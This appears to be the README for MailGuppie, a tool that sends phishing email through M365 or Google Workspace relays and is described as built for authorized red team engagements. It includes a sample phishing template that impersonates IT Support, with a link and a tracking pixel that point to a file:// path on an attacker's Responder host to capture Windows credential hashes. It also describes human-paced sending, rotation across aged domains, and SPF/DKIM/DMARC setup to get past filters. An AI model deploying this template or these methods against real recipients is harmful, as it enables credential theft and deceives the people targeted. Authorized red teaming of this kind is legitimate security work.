# MailGuppie

M365 SMTP email sender for authorized red team engagements.

Sends per-target HTML email through an M365 (or Google Workspace) SMTP relay, with per-target
SHA3 tracking hashes, configurable human-paced delays, dry-run preview, and resume support.

```
╔════════════════════════════════════════════════╗
║                  MailGuppie                    ║
╚════════════════════════════════════════════════╝

          ><((((º>   ><((((º>   ><((((º>

usage: MailGuppie.py -t <targets.txt> -r <responder> [options]

  -t, --targets    File containing one target email per line
  -r, --responder  Responder IP or hostname (substituted for <RESPONDER>)
  -c, --config     Email template file (default: config/template.conf)
  -s, --smtp       SMTP credentials file (default: config/smtp.conf)
  -l, --log        Append-only send log (default: send.log)
  --delay          Seconds between sends, supports range (default: 3-8)
  --dry-run        Render the first message and print it without sending
  --resume         Skip targets already marked SENT in the log
```

## Quick Start

**1. Configure SMTP credentials**

```bash
cp config/smtp.conf.example config/smtp.conf
# edit config/smtp.conf with your M365 relay account
```

Before this works, SMTP AUTH must be enabled for the sending mailbox in M365 Admin:
`Users > Active users > <user> > Mail > Manage email apps > Authenticated SMTP ✓`

**2. Verify your send before going live**

```bash
python3 MailGuppie.py -t targets.txt -r 10.0.1.100 --dry-run
```

**3. Send**

```bash
python3 MailGuppie.py -t targets.txt -r 10.0.1.100
```

**4. Resume after interruption**

```bash
python3 MailGuppie.py -t targets.txt -r 10.0.1.100 --resume
```

## Templates

Templates live in `config/` and use `# KEY: value` headers followed by an HTML body.

```
# SENDER: noreply@aged-domain.com
# SENDER_NAME: IT Support
# SUBJECT: Action Required — Account Review
# REPLY_TO: helpdesk@aged-domain.com    (optional)

<p>Hello,</p>
<p>Please review your account at <a href="file://<RESPONDER>/login">this link</a>.</p>
<img src="file://<RESPONDER>/track.gif" width="1" height="1">
```

**Available placeholders:**

| Placeholder       | Source                        |
|-------------------|-------------------------------|
| `<RESPONDER>`     | `-r` argument                 |
| `<SHA3_HASH>`     | SHA3-256 of target email (chars 22-42) — unique per target |
| `<TARGET_EMAIL>`  | Target email address          |
| `<SENDER>`        | Template `# SENDER:` header   |
| `<SENDER_NAME>`   | Template `# SENDER_NAME:` header |
| `<SUBJECT>`       | Template `# SUBJECT:` header  |
| any `# KEY:`      | `<KEY>` in the body           |

## Send Log

Every send is recorded in `send.log` (tab-separated):

```
SENT    target@corp.com    abc123hash    2026-08-02 14:30:00
FAIL    other@corp.com     def456hash    2026-08-02 14:30:05    [error]
```

Pass `--resume` on subsequent runs to skip already-sent targets.

## Multi-Domain Send

`send_all_domains.py` sends a template from every configured engagement domain in sequence.
The template `# SENDER:` must use `noreply@<domain.com>` — the wrapper substitutes the
real domain per send.

```bash
# Send to a single address from all domains
python3 send_all_domains.py -t target@corp.com -r 10.0.1.100

# Send to a targets file from all domains
python3 send_all_domains.py -t targets.txt -r 10.0.1.100

# Preview without sending
python3 send_all_domains.py -t target@corp.com -r 10.0.1.100 --dry-run
```

The domain list is configured in `DOMAINS` at the top of `send_all_domains.py`.

## M365 Tenant Setup (per domain)

1. Verify the aged domain in Azure Entra Admin → Custom domain names
2. Enable DKIM in Microsoft Defender → Email & collaboration → Policies & rules → DKIM
3. Set DNS records on the aged domain:
   - `SPF:   v=spf1 include:spf.protection.outlook.com -all`
   - `DMARC: v=DMARC1; p=quarantine; rua=mailto:dmarc@aged-domain.com`
   - DKIM CNAME records as provided by M365
4. Create a licensed mailbox on that domain and enable SMTP AUTH for it
5. Put the mailbox credentials in `config/smtp.conf`
